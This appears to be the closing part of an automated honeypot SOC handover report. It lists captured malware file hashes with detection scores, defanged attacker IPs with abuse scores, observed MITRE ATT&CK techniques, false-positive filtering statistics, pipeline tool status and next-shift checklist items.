| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.186[.]162` | US | Censys, Inc. | **100** ⚠️ | 45 |
| `118.122.147[.]49` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `103.158.40[.]65` | IN | Net Hub | **100** ⚠️ | 50 |
| `197.248.207[.]139` | KE | Safaricom Limited | **100** ⚠️ | 49 |
| `103.186.77[.]124` | PK | Nasstec Airnet Networks Private Limited | **75** | 1 |
| `84.15.217[.]252` | LV | Bite Latvija | **37** | 0 |
| `167.250.38[.]8` | PY | SOL TELECOMUNICACIONES S.A. | **34** | 0 |
| `177.45.18[.]95` | BR | TELEFÔNICA BRASIL S.A | **25** | 0 |
| `172.182.194[.]213` | US | Microsoft Limited | 8 | 0 |
| `196.238.242[.]136` | TN | SMARTPHONE | 4 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 26 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (42 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 4 below threshold 25 | 13 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 28 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 98 cases |
| Tool 34  | Credential Extractor        | ✅ 51 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 42 filtered (42.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 4 recon entry/entries in table (4 group(s) consolidating 31 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-22T19:53:34Z_
